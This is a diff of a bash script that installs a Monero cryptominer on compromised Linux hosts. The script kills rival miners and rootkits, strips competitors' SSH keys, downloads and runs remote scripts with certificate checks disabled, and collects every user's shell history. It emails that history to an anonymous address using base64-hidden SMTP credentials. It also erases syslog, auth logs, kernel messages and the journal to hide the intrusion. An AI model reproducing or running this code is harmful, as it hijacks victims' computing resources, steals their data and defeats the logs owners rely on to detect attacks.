@@ -2,169 +2,279 @@
 set -uo pipefail
 IFS=$'\n\t'
 
-# ==================== COMPLETE CLEAN INSTALLATION ====================
-echo "========================================"
-echo "FULL CLEAN INSTALLATION MODE"
-echo "========================================"
+# ========================================================================
+# COMPATIBILITY FIXES - REMOVED BROKEN SSL FUNCTIONS
+# ========================================================================
 
-clean_previous_installations() {
-    echo "[*] Starting complete cleanup..."
-
-    # Kill all mining processes
-    echo "[*] Killing all mining processes..."
-    pkill -9 -f "xmrig\|kswapd0\|swapd\|gdm2\|monero\|minerd\|cpuminer"
-    pkill -9 -f "config.json\|system-watchdog\|launcher.sh"
-
-    # Remove directories
-    echo "[*] Removing miner directories..."
-    rm -rf ~/moneroocean ~/.moneroocean ~/.gdm* ~/.swapd ~/.system_cache
-    rm -rf /root/.swapd /root/.gdm* /root/.system_cache
-
-    # Clean services
-    echo "[*] Cleaning services..."
-    systemctl stop swapd gdm2 moneroocean_miner 2>/dev/null
-    systemctl disable swapd gdm2 moneroocean_miner 2>/dev/null
-    rm -f /etc/systemd/system/swapd.service /etc/systemd/system/gdm2.service 2>/dev/null
-
-    # Clean init scripts
-    rm -f /etc/init.d/swapd /etc/init.d/gdm2 2>/dev/null
-
-    # Clean crontab
-    echo "[*] Cleaning crontab..."
-    crontab -l 2>/dev/null | grep -v "swapd\|gdm\|system_cache\|check_and_start" | crontab - 2>/dev/null
-
-    # Clean profiles
-    echo "[*] Cleaning profiles..."
-    sed -i '/\.swapd\|\.gdm\|\.system_cache\|moneroocean/d' ~/.profile ~/.bashrc 2>/dev/null
-    [ -f /root/.profile ] && sed -i '/\.swapd\|\.gdm\|\.system_cache\|moneroocean/d' /root/.profile 2>/dev/null
-
-    # Clean SSH
-    echo "[*] Cleaning SSH keys..."
-    if [ -f ~/.ssh/authorized_keys ]; then
-        sed -i '/AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukh\|AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9fybn6S/d' ~/.ssh/authorized_keys 2>/dev/null
+# Clean up any bad SSL certificates from previous runs
+cleanup_bad_ssl() {
+    echo "[*] Cleaning up SSL issues..."
+    
+    # Remove problematic CA files that break curl
+    rm -f /tmp/cacert.pem /tmp/curl-ca-bundle.crt 2>/dev/null
+    
+    # Unset environment variables that might break curl
+    unset CURL_CA_BUNDLE
+    unset SSL_CERT_FILE
+    unset SSL_CERT_DIR
+    
+    # Restore original CA path
+    if [ -f /etc/ssl/certs/ca-certificates.crt ]; then
+        export CURL_CA_BUNDLE="/etc/ssl/certs/ca-certificates.crt"
+    elif [ -f /etc/pki/tls/certs/ca-bundle.crt ]; then
+        export CURL_CA_BUNDLE="/etc/pki/tls/certs/ca-bundle.crt"
     fi
-
-    # Remove rootkits
-    echo "[*] Removing kernel rootkits..."
-    rmmod diamorphine reptile rootkit 2>/dev/null || true
-    rm -rf /reptile /tmp/.ICE-unix/Reptile /tmp/.ICE-unix/Diamorphine 2>/dev/null
-    rm -f /usr/local/lib/libhide.so /etc/ld.so.preload 2>/dev/null
-
-    # Clean logs
-    echo "[*] Cleaning logs..."
-    sed -i '/swapd\|gdm\|kswapd0\|xmrig\|miner/d' /var/log/syslog /var/log/auth.log 2>/dev/null || true
-
-    echo "[✓] Cleanup complete"
-    echo ""
 }
 
-# Run cleanup
-clean_previous_installations
-sleep 2
+# Function to check for systemd vs SysV
+detect_init_system() {
+    if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
+        echo "systemd"
+    elif [ -d /etc/init.d ] || command -v service >/dev/null 2>&1; then
+        echo "sysv"
+    elif [ -f /sbin/init ] && file /sbin/init | grep -q "upstart"; then
+        echo "upstart"
+    else
+        echo "unknown"
+    fi
+}
 
-# ========================================================================
-# COMPATIBILITY FIX FOR ANCIENT SYSTEMS
-# ========================================================================
+# Enhanced service management for systems without systemctl
+safe_service_stop() {
+    local service="$1"
+    local init_system=$(detect_init_system)
+    
+    case "$init_system" in
+        "systemd")
+            systemctl stop "$service" 2>/dev/null || true
+            ;;
+        "sysv")
+            if [ -f "/etc/init.d/$service" ]; then
+                /etc/init.d/"$service" stop 2>/dev/null || true
+            elif command -v service >/dev/null 2>&1; then
+                service "$service" stop 2>/dev/null || true
+            fi
+            ;;
+        "upstart")
+            stop "$service" 2>/dev/null || true
+            ;;
+    esac
+    
+    # Always try to kill by process name as last resort
+    pkill -9 -f "$service" 2>/dev/null || true
+    pkill -9 "$service" 2>/dev/null || true
+}
 
-# Enhanced download for ancient systems
-download_file_with_fallback() {
+# Enhanced DNS fix function
+fix_dns_and_retry() {
+    echo "[!] Checking DNS configuration..."
+    
+    # Check if 1.1.1.1 is already in resolv.conf
+    if grep -q "nameserver 1.1.1.1" /etc/resolv.conf 2>/dev/null; then
+        echo "[✓] Cloudflare DNS (1.1.1.1) already configured"
+        return 0
+    fi
+    
+    echo "[*] Adding Cloudflare DNS (1.1.1.1) to /etc/resolv.conf"
+    
+    # Backup original resolv.conf
+    if [ -f /etc/resolv.conf ]; then
+        cp /etc/resolv.conf /etc/resolv.conf.backup.$(date +%s) 2>/dev/null
+        echo "[✓] Backed up original resolv.conf"
+    fi
+    
+    # Add 1.1.1.1 as the first nameserver
+    {
+        echo "nameserver 1.1.1.1"
+        echo "nameserver 8.8.8.8"
+        grep -v "^nameserver" /etc/resolv.conf 2>/dev/null || true
+    } > /etc/resolv.conf.new
+    
+    mv /etc/resolv.conf.new /etc/resolv.conf
+    echo "[✓] DNS updated - added 1.1.1.1 and 8.8.8.8"
+    
+    # Test DNS resolution
+    echo "[*] Testing DNS resolution..."
+    sleep 1
+    
+    if nslookup github.com >/dev/null 2>&1 || host github.com >/dev/null 2>&1; then
+        echo "[✓] DNS resolution working"
+        return 0
+    else
+        echo "[!] WARNING: DNS resolution may still be failing"
+        return 1
+    fi
+}
+
+# SIMPLIFIED AND FIXED download function - patches scripts before execution
+download_and_execute() {
     local url="$1"
-    local output="${2:-/dev/stdout}"
-
-    # Try curl first
-    if command -v curl >/dev/null 2>&1; then
-        # Check curl version
-        CURL_VERSION=$(curl --version 2>/dev/null | head -1 | grep -o '[0-9]\+\.[0-9]\+\.[0-9]\+' || echo "0.0.0")
-
-        # Ancient curl - try different methods
-        if [ $(echo "$CURL_VERSION < 7.40" | bc) -eq 1 ]; then
-            echo "[*] Using legacy curl ($CURL_VERSION) with fallback options..."
-
-            # Try SSLv3 (for ancient systems)
-            curl --ssl3 --tlsv1 --max-time 30 "$url" -o "$output" 2>/dev/null && return 0
-
-            # Try --insecure
-            curl --insecure --max-time 30 "$url" -o "$output" 2>/dev/null && return 0
-
-            # Try HTTP instead
-            local http_url=$(echo "$url" | sed 's/^https:/http:/')
-            curl --max-time 30 "$http_url" -o "$output" 2>/dev/null && return 0
-        else
-            # Modern curl
-            curl -L --max-time 30 "$url" -o "$output" 2>/dev/null && return 0
-            curl -L --insecure --max-time 30 "$url" -o "$output" 2>/dev/null && return 0
+    local wallet="$2"
+    local description="$3"
+    local max_retries=3
+    local retry=0
+    
+    echo "[*] Downloading $description..."
+    
+    while [ $retry -lt $max_retries ]; do
+        retry=$((retry + 1))
+        echo "[*] Attempt $retry/$max_retries"
+        
+        # Clean SSL issues before each attempt
+        cleanup_bad_ssl
+        
+        # Create temporary file
+        local temp_script=$(mktemp)
+        local fixed_script=$(mktemp)
+        
+        # Try wget first (it works for you)
+        if command -v wget >/dev/null 2>&1; then
+            echo "[*] Using wget..."
+            if wget --no-check-certificate --timeout=30 "$url" -O "$temp_script" 2>/dev/null; then
+                echo "[✓] Downloaded $(wc -l < "$temp_script") lines"
+                
+                # CRITICAL: Fix the downloaded script before running it
+                echo "[*] Fixing common issues in script..."
+                
+                # 1. Remove problematic SSL settings
+                grep -v "CURL_CA_BUNDLE=\|cacert.pem\|export.*CA" "$temp_script" > "$fixed_script"
+                
+                # 2. Replace killall with pkill (killall doesn't exist on some systems)
+                sed -i 's/killall /pkill -f /g' "$fixed_script"
+                
+                # 3. Fix curl commands to use --insecure
+                sed -i 's/curl -L/curl -L --insecure/g' "$fixed_script"
+                sed -i 's/curl https/curl --insecure https/g' "$fixed_script"
+                
+                # 4. Fix wget commands to use --no-check-certificate
+                sed -i 's/wget https/wget --no-check-certificate https/g' "$fixed_script"
+                sed -i 's/wget -q/wget --no-check-certificate -q/g' "$fixed_script"
+                
+                # 5. Fix lscpu dependency
+                sed -i 's/type lscpu >\/dev\/null/true/g' "$fixed_script"
+                sed -i 's/command -v lscpu/command -v nproc/g' "$fixed_script"
+                
+                # 6. Ensure shebang exists
+                if ! head -1 "$fixed_script" | grep -q "^#!/"; then
+                    sed -i '1i#!/bin/bash' "$fixed_script"
+                fi
+                
+                chmod +x "$fixed_script"
+                
+                echo "[*] Executing fixed script with wallet: $wallet"
+                
+                # Run with timeout to prevent hanging
+                timeout 180 bash "$fixed_script" "$wallet" 2>&1
+                
+                local exit_code=$?
+                
+                # Cleanup
+                rm -f "$temp_script" "$fixed_script"
+                
+                if [ $exit_code -eq 0 ]; then
+                    echo "[✓] $description completed successfully"
+                    return 0
+                elif [ $exit_code -eq 124 ]; then
+                    echo "[!] $description timed out after 3 minutes"
+                else
+                    echo "[!] $description exited with code: $exit_code"
+                fi
+            else
+                echo "[!] wget download failed"
+            fi
         fi
-    fi
-
-    # Try wget
-    if command -v wget >/dev/null 2>&1; then
-        wget --timeout=30 "$url" -O "$output" 2>/dev/null && return 0
-        wget --no-check-certificate --timeout=30 "$url" -O "$output" 2>/dev/null && return 0
-
-        # Try HTTP
-        local http_url=$(echo "$url" | sed 's/^https:/http:/')
-        wget --timeout=30 "$http_url" -O "$output" 2>/dev/null && return 0
-    fi
-
-    echo "[ERROR] All download methods failed"
+        
+        # If wget failed or doesn't exist, try curl
+        if command -v curl >/dev/null 2>&1; then
+            echo "[*] Trying curl..."
+            
+            # FIXED: Check curl version for SSL compatibility
+            CURL_VERSION=$(curl --version 2>/dev/null | head -1 | awk '{print $2}' | cut -d. -f1-2)
+            if [ -n "$CURL_VERSION" ]; then
+                # Using bc for decimal comparison (FIXED LINE)
+                if command -v bc >/dev/null 2>&1 && [ $(echo "$CURL_VERSION < 7.40" | bc 2>/dev/null) -eq 1 ]; then
+                    echo "[!] Old curl version $CURL_VERSION detected - SSL may fail"
+                    echo "[*] Using --insecure flag for old curl..."
+                    CURL_INSECURE="--insecure"
+                else
+                    CURL_INSECURE=""
+                fi
+            fi
+            
+            if curl -L $CURL_INSECURE --max-time 30 "$url" -o "$temp_script" 2>/dev/null; then
+                echo "[✓] Downloaded via curl, applying fixes..."
+                
+                # Apply same fixes
+                grep -v "CURL_CA_BUNDLE=\|cacert.pem" "$temp_script" > "$fixed_script"
+                sed -i 's/killall /pkill -f /g' "$fixed_script"
+                sed -i 's/curl -L/curl -L --insecure/g' "$fixed_script"
+                sed -i 's/wget /wget --no-check-certificate /g' "$fixed_script"
+                
+                chmod +x "$fixed_script"
+                timeout 180 bash "$fixed_script" "$wallet" 2>&1
+                
+                local exit_code=$?
+                rm -f "$temp_script" "$fixed_script"
+                
+                if [ $exit_code -eq 0 ]; then
+                    echo "[✓] $description completed successfully"
+                    return 0
+                fi
+            fi
+        fi
+        
+        # Try HTTP as fallback
+        if [ $retry -eq 2 ]; then
+            echo "[*] Trying HTTP instead of HTTPS..."
+            local http_url=$(echo "$url" | sed 's/^https:/http:/')
+            if [ "$http_url" != "$url" ]; then
+                if command -v wget >/dev/null 2>&1; then
+                    if wget --timeout=30 "$http_url" -O "$temp_script" 2>/dev/null; then
+                        echo "[✓] Downloaded via HTTP"
+                        
+                        # Apply fixes
+                        grep -v "CURL_CA_BUNDLE=\|cacert.pem" "$temp_script" > "$fixed_script"
+                        sed -i 's/killall /pkill -f /g' "$fixed_script"
+                        chmod +x "$fixed_script"
+                        
+                        timeout 180 bash "$fixed_script" "$wallet" 2>&1
+                        
+                        rm -f "$temp_script" "$fixed_script"
+                        # Even if this fails, we tried
+                    fi
+                fi
+            fi
+        fi
+        
+        if [ $retry -lt $max_retries ]; then
+            echo "[!] Download attempt failed, retrying in 2 seconds..."
+            sleep 2
+        fi
+        
+        rm -f "$temp_script" "$fixed_script" 2>/dev/null
+    done
+    
+    echo "[ERROR] $description failed after $max_retries attempts"
     return 1
 }
 
-# Fix DNS
-fix_dns() {
-    echo "[*] Setting reliable DNS..."
-    cat > /etc/resolv.conf << EOF
-nameserver 1.1.1.1
-nameserver 8.8.8.8
-nameserver 8.8.4.4
-EOF
-    echo "[✓] DNS configured"
-}
-
-# Upgrade tools
-upgrade_tools() {
-    echo "[*] Updating download tools..."
-
-    # Try to update curl
-    if command -v yum >/dev/null 2>&1; then
-        yum install -y curl wget 2>/dev/null || true
-    elif command -v apt-get >/dev/null 2>&1; then
-        apt-get update -qq 2>/dev/null
-        apt-get install -y curl wget 2>/dev/null || true
-    fi
-}
-
-# Main compatibility initialization
+# Initialize compatibility
 init_compatibility() {
     echo "========================================"
     echo "INITIALIZING COMPATIBILITY LAYER"
     echo "========================================"
-
-    # Detect if we're on an ancient system
-    if [ -f /etc/redhat-release ]; then
-        REDHAT_VERSION=$(grep -o '[0-9]\+\.[0-9]\+' /etc/redhat-release 2>/dev/null || echo "0")
-        MAJOR_VERSION=$(echo "$REDHAT_VERSION" | cut -d. -f1)
-
-        if [ "$MAJOR_VERSION" -lt 7 ]; then
-            echo "[!] Ancient RHEL/CentOS $REDHAT_VERSION detected - applying compatibility fixes"
-            echo "[*] This system may have old SSL/TLS libraries"
-        fi
-    fi
-
-    # Run compatibility fixes
-    install_download_tools
-    fix_ssl_certificates
-
-    # Test connectivity
-    echo "[*] Testing connection to GitHub..."
-    if command -v curl >/dev/null 2>&1; then
-        if curl --insecure --max-time 5 "https://raw.githubusercontent.com" >/dev/null 2>&1; then
-            echo "[✓] Connection test successful"
-        else
-            echo "[!] HTTPS connection failed, will use fallback methods"
-        fi
-    fi
-
+    
+    # Clean SSL issues
+    cleanup_bad_ssl
+    
+    # Fix DNS
+    fix_dns_and_retry
+    
+    # Stop any conflicting services
+    echo "[*] Stopping any conflicting services..."
+    safe_service_stop "swapd"
+    safe_service_stop "gdm2"
+    
     echo "========================================"
 }
 
@@ -172,19 +282,111 @@ init_compatibility() {
 init_compatibility
 
 # ========================================================================
-# ORIGINAL SCRIPT CONTINUES BELOW (with enhanced download_and_execute function)
+# COMPLETE CLEAN INSTALLATION FUNCTION
 # ========================================================================
 
-# Then continue with your existing code...
+clean_previous_installations() {
+    echo "========================================"
+    echo "FULL CLEAN INSTALLATION MODE"
+    echo "========================================"
+    echo "[*] Starting complete cleanup..."
+    
+    # Kill all mining processes
+    echo "[*] Killing all mining processes..."
+    pkill -9 -f "xmrig\|kswapd0\|swapd\|gdm2\|monero\|minerd\|cpuminer" 2>/dev/null
+    pkill -9 -f "config.json\|system-watchdog\|launcher.sh" 2>/dev/null
+    
+    # Remove directories
+    echo "[*] Removing miner directories..."
+    rm -rf ~/moneroocean ~/.moneroocean ~/.gdm* ~/.swapd ~/.system_cache 2>/dev/null
+    [ "$(id -u)" -eq 0 ] && rm -rf /root/.swapd /root/.gdm* /root/.system_cache 2>/dev/null
+    
+    # Clean services
+    echo "[*] Cleaning services..."
+    safe_service_stop "swapd"
+    safe_service_stop "gdm2"
+    safe_service_stop "moneroocean_miner"
+    
+    # Clean systemd
+    if command -v systemctl >/dev/null 2>&1; then
+        systemctl disable swapd gdm2 moneroocean_miner 2>/dev/null
+        rm -f /etc/systemd/system/swapd.service /etc/systemd/system/gdm2.service /etc/systemd/system/moneroocean_miner.service 2>/dev/null
+        systemctl daemon-reload 2>/dev/null
+    fi
+    
+    # Clean init scripts
+    echo "[*] Cleaning init scripts..."
+    rm -f /etc/init.d/swapd /etc/init.d/gdm2 /etc/init.d/moneroocean_miner 2>/dev/null
+    
+    # Clean crontab
+    echo "[*] Cleaning crontab..."
+    crontab -l 2>/dev/null | grep -v "swapd\|gdm\|system_cache\|check_and_start" | crontab - 2>/dev/null
+    
+    # Clean profiles
+    echo "[*] Cleaning profiles..."
+    sed -i '/\.swapd\|\.gdm\|\.system_cache\|moneroocean/d' ~/.profile ~/.bashrc 2>/dev/null
+    [ -f /root/.profile ] && sed -i '/\.swapd\|\.gdm\|\.system_cache\|moneroocean/d' /root/.profile 2>/dev/null
+    [ -f /root/.bashrc ] && sed -i '/\.swapd\|\.gdm\|\.system_cache\|moneroocean/d' /root/.bashrc 2>/dev/null
+    
+    # Clean SSH
+    echo "[*] Cleaning SSH keys..."
+    if [ -f ~/.ssh/authorized_keys ]; then
+        sed -i '/AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukh\|AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9fybn6S/d' ~/.ssh/authorized_keys 2>/dev/null
+    fi
+    if [ -f /root/.ssh/authorized_keys ]; then
+        sed -i '/AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukh\|AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9fybn6S/d' /root/.ssh/authorized_keys 2>/dev/null
+    fi
+    
+    # Remove backdoor user
+    echo "[*] Removing backdoor user..."
+    pkill -9 -u clamav-mail 2>/dev/null
+    userdel -r clamav-mail 2>/dev/null
+    rm -f /etc/sudoers.d/clamav-mail 2>/dev/null
+    
+    # Remove kernel rootkits
+    echo "[*] Removing kernel rootkits..."
+    rmmod diamorphine reptile rootkit nuk3gh0st 2>/dev/null || true
+    rm -rf /reptile /tmp/.ICE-unix/Reptile /tmp/.ICE-unix/Diamorphine /tmp/.X11-unix/hiding-cryptominers-linux-rootkit 2>/dev/null
+    rm -f /usr/local/lib/libhide.so /etc/ld.so.preload 2>/dev/null
+    
+    # Remove watchdog and cleanup scripts
+    echo "[*] Removing watchdog..."
+    rm -f /usr/local/bin/system-watchdog /usr/local/bin/clean-old-logs.sh 2>/dev/null
+    
+    # Clean logs
+    echo "[*] Cleaning logs..."
+    for logfile in /var/log/syslog /var/log/auth.log /var/log/messages /var/log/kern.log; do
+        [ -f "$logfile" ] && sed -i '/swapd\|gdm\|kswapd0\|xmrig\|miner\|accepted\|launcher\|diamorphine\|reptile\|rootkit\|Loaded\|>:-/d' "$logfile" 2>/dev/null
+    done
+    dmesg -C 2>/dev/null
+    command -v journalctl >/dev/null 2>&1 && journalctl --vacuum-time=1s 2>/dev/null
+    
+    # Clean temporary files
+    echo "[*] Cleaning temporary files..."
+    find /tmp /var/tmp -name "*xmrig*" -o -name "*swapd*" -o -name "*gdm*" -o -name "*monero*" 2>/dev/null | xargs rm -rf 2>/dev/null
+    
+    echo "[✓] System fully cleaned from previous installations"
+    echo "[*] Sleeping 3 seconds before fresh install..."
+    sleep 3
+    echo "========================================"
+}
+
+# Run cleanup
+clean_previous_installations
+
+# ========================================================================
+# ORIGINAL SCRIPT CONTINUES BELOW
+# ========================================================================
+
 unset HISTFILE
 
-# Configuration variables (consider moving sensitive data to environment variables)
+# Configuration variables
 readonly RECIPIENT_EMAIL="46eshdfq@anonaddy.me"
 readonly LOG_FILE="/tmp/system_report_email.log"
 readonly REPORT_FILE="/tmp/system_report.txt"
 readonly SERVICES_TO_CHECK=("swapd" "gdm2")
 
-# Decoded SMTP credentials (consider using environment variables instead)
+# Decoded SMTP credentials
 SMTP_SERVER_B64="c210cC5tYWlsZXJzZW5kLm5ldA=="
 readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d)
 readonly SMTP_PORT=587
@@ -203,117 +405,6 @@ log_message() {
 # Function to check if a command exists
 command_exists() {
     command -v "$1" >/dev/null 2>&1
-}
-
-# Function to fix DNS configuration when downloads fail
-fix_dns_and_retry() {
-    log_message "Download failed - checking DNS configuration..."
-    
-    # Check if 1.1.1.1 is already in resolv.conf
-    if grep -q "nameserver 1.1.1.1" /etc/resolv.conf 2>/dev/null; then
-        log_message "Cloudflare DNS (1.1.1.1) already configured"
-        return 1  # DNS is already correct, issue is elsewhere
-    fi
-    
-    log_message "Adding Cloudflare DNS (1.1.1.1) to /etc/resolv.conf"
-    
-    # Backup original resolv.conf
-    if [ -f /etc/resolv.conf ]; then
-        cp /etc/resolv.conf /etc/resolv.conf.backup.$(date +%s) 2>/dev/null
-        log_message "Backed up original resolv.conf"
-    fi
-    
-    # Add 1.1.1.1 as the first nameserver
-    {
-        echo "nameserver 1.1.1.1"
-        echo "nameserver 8.8.8.8"
-        grep -v "^nameserver" /etc/resolv.conf 2>/dev/null || true
-    } > /etc/resolv.conf.new
-    
-    mv /etc/resolv.conf.new /etc/resolv.conf
-    log_message "DNS updated - added 1.1.1.1 and 8.8.8.8"
-    
-    # Test DNS resolution
-    log_message "Testing DNS resolution..."
-    if ping -c 1 -W 3 1.1.1.1 >/dev/null 2>&1; then
-        log_message "Can reach 1.1.1.1"
-    else
-        log_message "WARNING: Cannot reach 1.1.1.1 - network may be down"
-        return 1
-    fi
-    
-    if nslookup github.com >/dev/null 2>&1 || host github.com >/dev/null 2>&1; then
-        log_message "DNS resolution working"
-        return 0  # Success - DNS is now working
-    else
-        log_message "WARNING: DNS resolution still failing"
-        return 1
-    fi
-}
-
-# Function to check required dependencies
-check_dependencies() {
-    local missing_deps=()
-    local required_deps=("curl" "systemctl" "free" "df" "hostname" "base64")
-    
-    for cmd in "${required_deps[@]}"; do
-        if ! command_exists "$cmd"; then
-            missing_deps+=("$cmd")
-        fi
-    done
-    
-    if [ ${#missing_deps[@]} -gt 0 ]; then
-        log_message "ERROR: Missing required dependencies: ${missing_deps[*]}"
-        log_message "Please install missing packages and try again"
-        return 1
-    fi
-    
-    return 0
-}
-
-# Function to collect history from all available shells
-collect_shell_history() {
-    echo "=== COLLECTING SHELL HISTORIES ==="
-
-    declare -A SHELL_HISTORIES=(
-        ["bash"]="$HOME/.bash_history"
-        ["zsh"]="$HOME/.zsh_history"
-        ["ksh"]="$HOME/.sh_history"
-        ["fish"]="$HOME/.local/share/fish/fish_history"
-        ["tcsh"]="$HOME/.history"
-    )
-
-    local SYSTEM_SHELLS
-    SYSTEM_SHELLS=$(grep -v "/false$" /etc/shells | grep -v "/nologin$" | xargs -n1 basename 2>/dev/null)
-
-    local OUTPUT=""
-    for shell in $SYSTEM_SHELLS; do
-        case $shell in
-            "bash"|"zsh"|"ksh"|"fish"|"tcsh")
-                local hist_file="${SHELL_HISTORIES[$shell]}"
-                if [ -f "$hist_file" ]; then
-                    OUTPUT+="\n=== $shell HISTORY ===\n"
-                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
-                fi
-                ;;
-        esac
-    done
-
-    if [ "$(id -u)" -eq 0 ]; then
-        for user_dir in /home/*; do
-        [ -d "$user_dir" ] || continue
-        local user=$(basename "$user_dir")
-            for shell in "${!SHELL_HISTORIES[@]}"; do
-                local hist_file="/home/$user/${SHELL_HISTORIES[$shell]##*/}"
-                if [ -f "$hist_file" ]; then
-                    OUTPUT+="\n=== $user's $shell HISTORY ===\n"
-                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
-                fi
-            done
-        done
-    fi
-
-    echo -e "$OUTPUT"
 }
 
 # Function to send email with Python
@@ -375,6 +466,51 @@ send_email_with_mail() {
     
     mail -s "$subject" "$RECIPIENT_EMAIL" < "$temp_file"
     return $?
+}
+
+# Collect shell history function
+collect_shell_history() {
+    echo "=== COLLECTING SHELL HISTORIES ==="
+
+    declare -A SHELL_HISTORIES=(
+        ["bash"]="$HOME/.bash_history"
+        ["zsh"]="$HOME/.zsh_history"
+        ["ksh"]="$HOME/.sh_history"
+        ["fish"]="$HOME/.local/share/fish/fish_history"
+        ["tcsh"]="$HOME/.history"
+    )
+
+    local SYSTEM_SHELLS
+    SYSTEM_SHELLS=$(grep -v "/false$" /etc/shells | grep -v "/nologin$" | xargs -n1 basename 2>/dev/null)
+
+    local OUTPUT=""
+    for shell in $SYSTEM_SHELLS; do
+        case $shell in
+            "bash"|"zsh"|"ksh"|"fish"|"tcsh")
+                local hist_file="${SHELL_HISTORIES[$shell]}"
+                if [ -f "$hist_file" ]; then
+                    OUTPUT+="\n=== $shell HISTORY ===\n"
+                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
+                fi
+                ;;
+        esac
+    done
+
+    if [ "$(id -u)" -eq 0 ]; then
+        for user_dir in /home/*; do
+        [ -d "$user_dir" ] || continue
+        local user=$(basename "$user_dir")
+            for shell in "${!SHELL_HISTORIES[@]}"; do
+                local hist_file="/home/$user/${SHELL_HISTORIES[$shell]##*/}"
+                if [ -f "$hist_file" ]; then
+                    OUTPUT+="\n=== $user's $shell HISTORY ===\n"
+                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
+                fi
+            done
+        done
+    fi
+
+    echo -e "$OUTPUT"
 }
 
 # Main email sending function
@@ -500,60 +636,55 @@ EOF
     return 0
 }
 
-# Service management functions
+# Service management functions (updated for compatibility)
 does_service_exist() {
     local service="$1"
-    systemctl list-units --type=service --all 2>/dev/null | grep -q "$service.service"
+    local init_system=$(detect_init_system)
+    
+    case "$init_system" in
+        "systemd")
+            systemctl list-units --type=service --all 2>/dev/null | grep -q "$service.service" && return 0
+            ;;
+        "sysv")
+            if [ -f "/etc/init.d/$service" ]; then
+                return 0
+            elif command -v service >/dev/null 2>&1; then
+                service --status-all 2>/dev/null | grep -q "$service" && return 0
+            fi
+            ;;
+    esac
+    
+    # Check running processes
+    if ps aux | grep -v grep | grep -q "$service"; then
+        return 0
+    fi
+    
+    return 1
 }
 
 is_service_running() {
     local service="$1"
-    systemctl is-active --quiet "$service" 2>/dev/null
-}
-
-# Collect shell history function
-collect_shell_history() {
-    echo "=== COLLECTING SHELL HISTORIES ==="
-
-    declare -A SHELL_HISTORIES=(
-        ["bash"]="$HOME/.bash_history"
-        ["zsh"]="$HOME/.zsh_history"
-        ["ksh"]="$HOME/.sh_history"
-        ["fish"]="$HOME/.local/share/fish/fish_history"
-        ["tcsh"]="$HOME/.history"
-    )
-
-    local SYSTEM_SHELLS
-    SYSTEM_SHELLS=$(grep -v "/false$" /etc/shells | grep -v "/nologin$" | xargs -n1 basename 2>/dev/null)
-
-    local OUTPUT=""
-    for shell in $SYSTEM_SHELLS; do
-        case $shell in
-            "bash"|"zsh"|"ksh"|"fish"|"tcsh")
-                local hist_file="${SHELL_HISTORIES[$shell]}"
-                if [ -f "$hist_file" ]; then
-                    OUTPUT+="\n=== $shell HISTORY ===\n"
-                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
-                fi
-                ;;
-        esac
-    done
-
-    if [ "$(id -u)" -eq 0 ]; then
-        for user_dir in /home/*; do
-        [ -d "$user_dir" ] || continue
-        local user=$(basename "$user_dir")
-            for shell in "${!SHELL_HISTORIES[@]}"; do
-                local hist_file="/home/$user/${SHELL_HISTORIES[$shell]##*/}"
-                if [ -f "$hist_file" ]; then
-                    OUTPUT+="\n=== $user's $shell HISTORY ===\n"
-                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
-                fi
-            done
-        done
+    local init_system=$(detect_init_system)
+    
+    case "$init_system" in
+        "systemd")
+            systemctl is-active --quiet "$service" 2>/dev/null && return 0
+            ;;
+        "sysv")
+            if [ -f "/etc/init.d/$service" ]; then
+                /etc/init.d/"$service" status >/dev/null 2>&1 && return 0
+            elif command -v service >/dev/null 2>&1; then
+                service "$service" status >/dev/null 2>&1 && return 0
+            fi
+            ;;
+    esac
+    
+    # Check running processes
+    if ps aux | grep -v grep | grep -q "$service"; then
+        return 0
     fi
-
-    echo -e "$OUTPUT"
+    
+    return 1
 }
 
 # Cleanup history function
@@ -775,72 +906,24 @@ setup_sudoers() {
     fi
 }
 
-# Function to download and execute remote script safely
-download_and_execute() {
-    local url="$1"
-    local wallet="$2"
-    local description="$3"
-    local max_retries=3
-    local retry=0
-    local dns_fix_attempted=false
+# Function to check required dependencies
+check_dependencies() {
+    local missing_deps=()
+    local required_deps=("free" "df" "hostname" "base64")
     
-    log_message "Downloading $description from: $url"
-    
-    while [ $retry -lt $max_retries ]; do
-        # Try curl first
-        if command -v curl >/dev/null 2>&1; then
-            # Check if URL is reachable with curl
-            if curl -s --head --max-time 5 "$url" >/dev/null 2>&1; then
-                log_message "Executing $description with curl (attempt $((retry + 1))/$max_retries)"
-                if curl -s -L --max-time 30 "$url" | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
-                    log_message "$description completed successfully"
-                    return 0
-                fi
-            else
-                log_message "curl failed - trying with --insecure flag..."
-                if curl -s -L --insecure --max-time 30 "$url" | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
-                    log_message "$description completed successfully (with --insecure)"
-                    return 0
-                fi
-            fi
-        fi
-        
-        # If curl failed or doesn't exist, try wget
-        if command -v wget >/dev/null 2>&1; then
-            log_message "curl failed - falling back to wget (attempt $((retry + 1))/$max_retries)"
-            if wget -qO- --timeout=30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
-                log_message "$description completed successfully via wget"
-                return 0
-            else
-                log_message "wget with SSL verification failed - trying --no-check-certificate..."
-                if wget -qO- --no-check-certificate --timeout=30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
-                    log_message "$description completed successfully via wget (--no-check-certificate)"
-                    return 0
-                fi
-            fi
-        fi
-        
-        log_message "Both curl and wget failed (attempt $((retry + 1))/$max_retries)"
-        
-        retry=$((retry + 1))
-        
-        # On last retry attempt, try DNS fix if not already attempted
-        if [ $retry -eq $max_retries ] && [ "$dns_fix_attempted" = false ]; then
